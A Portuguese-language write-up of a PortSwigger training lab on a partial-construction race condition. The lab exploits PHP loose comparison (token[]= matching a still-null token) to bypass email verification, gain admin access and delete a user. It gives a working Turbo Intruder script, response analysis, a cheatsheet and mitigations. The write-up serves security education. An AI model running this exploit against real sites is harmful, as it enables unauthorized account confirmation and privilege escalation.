---
title: "Race Conditions de Construção Parcial"
platform: "PortSwigger"
category: "Race Conditions"
difficulty: "Expert"
date: 2026-04-15
techniques: ["Partial Construction", "Token Bypass", "PHP Type Juggling"]
description: "Race de construção parcial no registro — `token[]=` casa com NULL via type juggling do PHP enquanto o token ainda é gerado, burlando a verificação de email."
lang: pt-br
translation_key: race-condition-partial-construction
permalink: /writeups/race-condition-partial-construction/pt/
---

## Plataforma
PortSwigger Web Security Academy

## Categoria
Race Conditions

## Dificuldade
Expert

## Objetivo
Explorar uma race condition no mecanismo de registro de usuário pra burlar a verificação de email, registrar com um endereço arbitrário em `@ginandjuice.shop`, fazer login e deletar o usuário carlos.

---

## Contexto

O lab tem um sistema de registro de usuário que requer verificação de email via link de confirmação com um token. Existe uma race condition na construção parcial do registro do usuário — entre o momento em que o usuário é criado no banco e o token de confirmação é gerado, o campo do token está temporariamente em null. Ao enviar uma requisição de confirmação com array vazio (`token[]=`) durante essa janela, a comparação loose do PHP casa o array vazio contra o valor null, burlando a verificação completamente.

---

## Reconhecimento

### Endpoints Principais
| Endpoint | Método | Propósito |
|---|---|---|
| `/register` | POST | Registrar nova conta |
| `/confirm` | POST | Confirmar email com token |
| `/login` | POST | Login |
| `/admin` | GET | Painel admin |
| `/admin/delete?username=carlos` | GET | Deletar usuário |
| `/resources/static/users.js` | GET | JavaScript dos formulários de registro e confirmação |

### Análise do JavaScript
O arquivo `/resources/static/users.js` revelou o fluxo de confirmação:

```javascript
const confirmEmail = () => {
    const parts = window.location.href.split("?");
    const query = parts.length == 2 ? parts[1] : "";
    const action = query.includes('token') ? query : "";
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = '/confirm?' + action;
    // ...
}
```

O endpoint de confirmação aceita um parâmetro token via query string e o submete como POST.

### Teste de Comportamento do Token
| Requisição | Resposta |
|---|---|
| `POST /confirm?token=1` | 400 — "Incorrect token: 1" |
| `POST /confirm` (sem token) | 400 — "Missing parameter: token" |
| `POST /confirm?token=` (vazio) | 403 — "Forbidden" (patcheado!) |
| `POST /confirm?token[]=` (array vazio) | 400 — "Incorrect token: Array" |

A resposta **403 Forbidden** no token vazio indica que os devs patchearam o bypass óbvio. Porém, `token[]=` (array) retorna "Incorrect token: Array" — o servidor aceita e processa. Esse é o vetor de ataque.

### Análise da Janela de Race
O processo de registro internamente segue estes passos:
1. Cria registro do usuário no banco (token = null inicialmente)
2. Gera token de confirmação
3. Armazena token no banco
4. Envia email de confirmação com o token

Entre os passos 1 e 3, o campo do token é **null**. Em PHP, `[] == null` avalia como `true` por causa da comparação loose (type juggling). Enviar `token[]=` durante essa janela burla a verificação.

---

## Exploração

### Fluxo Vulnerável (Construção Parcial)
```
POST /register (user0):
  Step 1: INSERT user (token = NULL)  ←── JANELA DE RACE
  Step 2: Gerar token = "abc123"            ↑
  Step 3: UPDATE token = "abc123"     POST /confirm?token[]= chega aqui
  Step 4: Enviar email                PHP: [] == NULL → true → CONFIRMADO!
```

### Passos do Ataque

1. **Analisei o JavaScript** em `/resources/static/users.js` pra entender o fluxo de confirmação
2. **Testei variações** do parâmetro token pra descobrir que `token[]=` (array vazio) é processado pelo servidor
3. **Identifiquei a janela de construção parcial** — entre criação do usuário e geração do token, o campo é null
4. **Enviei POST /register pro Turbo Intruder** pra ataques paralelos automatizados
5. **Configurei o script do Turbo Intruder** pra mandar 20 tentativas de registro, cada uma com 50 confirmações em paralelo:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    confirmReq = '''POST /confirm?token[]= HTTP/2
Host: 0a6300e10367d5998189843e002e002d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

'''

    for attempt in range(20):
        username = 'user' + str(attempt)
        registerReq = target.req.replace('bruno1', username)
        engine.queue(registerReq, gate=str(attempt))
        for i in range(50):
            engine.queue(confirmReq, gate=str(attempt))
        engine.openGate(str(attempt))

def handleResponse(req, interesting):
    if 'User already exists' not in req.response and 'Incorrect token' not in req.response:
        table.add(req)
```

6. **Lancei o ataque** — 20 tentativas × 51 requisições = 1.020 no total
7. **Análise dos resultados** — respostas com Content-Length diferente (2744 vs 2827) indicaram confirmações bem-sucedidas
8. **Logado** como `user1` com senha `teste` — email confirmado `user1@ginandjuice.shop`
9. **Acessei o painel Admin** — disponível por causa do email `@ginandjuice.shop`
10. **Deletei o usuário carlos** — lab solved

### Resultado
- **Contas confirmadas via race condition:** 11 de 20 (user1, user3, user4, user5, user6, user7, user9, user12, user13, user14, user17)
- **Taxa de sucesso:** 55%
- **Acesso admin alcançado** via `user1@ginandjuice.shop`
- **Usuário carlos deletado**

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID |
|---|---|---|
| Initial Access | Valid Accounts | T1078 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Defense Evasion | Exploitation for Defense Evasion | T1211 |

### CWE
- **CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- **CWE-367:** Time-of-Check Time-of-Use (TOCTOU) Race Condition
- **CWE-1289:** Improper Validation of Unsafe Equivalence in Input

---

## Conceitos-Chave Aprendidos

| Conceito | Descrição |
|---|---|
| Construção Parcial | Explorar a janela entre criação do registro e populamento dos campos no banco |
| Type Juggling do PHP | Comparação loose do PHP: `[] == null` avalia como `true`, burlando validação de token |
| Bypass de Token via Array | Enviar `token[]=` em vez de `token=` pra explorar type juggling contra valores null |
| Racing em Alto Volume | Mandar 50 confirmações por tentativa de registro maximiza hits na janela de race |
| Análise de Tamanho de Resposta | Content-Length diferentes nas respostas indicam caminhos de código diferentes (sucesso vs falha) |

---

## Ferramentas Utilizadas

| Ferramenta | Propósito |
|---|---|
| Burp Suite Community | Proxy, HTTP History, Repeater |
| Turbo Intruder | Requisições paralelas automatizadas com gate pra timing preciso |
| Firefox (Kali) | Navegador com proxy configurado em 127.0.0.1:8080 |

---

## Cheatsheet de Comandos & Técnicas

```
# Fluxo de Ataque de Race Condition de Construção Parcial
1. Analisar JavaScript pro comportamento do endpoint de confirmação
2. Testar variações do parâmetro token:
   - token=1         → "Incorrect token"
   - (sem token)     → "Missing parameter"
   - token=          → "Forbidden" (patcheado)
   - token[]=        → "Incorrect token: Array" (processa!)
3. Enviar POST /register pro Turbo Intruder
4. Script: pra cada tentativa, enfileirar 1 register + 50 confirmações no mesmo gate
5. Usar Engine.BURP2 pra single-packet attack
6. Filtrar resultados: excluir "User already exists" e "Incorrect token"
7. Analisar tamanhos das respostas pra confirmações bem-sucedidas
8. Login com username confirmado + senha original
```

---

## Mitigação

Para prevenir race conditions de construção parcial:

- **Gerar token antes do INSERT:** Criar o token de confirmação primeiro, depois inserir o registro completo do usuário com o token já populado — sem janela null
- **Usar comparação estrita:** Em PHP, usar `===` em vez de `==` pra prevenir type juggling (`[] === null` é `false`)
- **Validar tipo do token:** Rejeitar valores não-string no servidor antes da comparação
- **Criação atômica do registro:** Usar transação de banco que cria usuário e token numa operação atômica única
- **Não aceitar parâmetros array:** Sanitizar input pra rejeitar parâmetros do tipo array em campos escalares

---

## Reflexão

Esse lab Expert combina duas classes de vulnerabilidade: race conditions e type juggling do PHP. A janela de race entre criação do usuário (token = null) e geração do token é extremamente pequena, exigindo 50 confirmações paralelas por tentativa pra acertar de forma confiável. O insight chave foi descobrir que `token[]=` burla o patch dos devs em tokens vazios — enquanto eles bloquearam `token=` com 403, não consideraram a comparação loose do PHP tratando array vazio como igual a null. A taxa de sucesso de 55% (11/20 tentativas) mostra que com requisições paralelas suficientes, mesmo janelas minúsculas viram exploráveis de forma confiável. Esse é o ataque de race condition mais sofisticado da série, combinando exploração de timing com fraquezas específicas do sistema de tipos da linguagem.
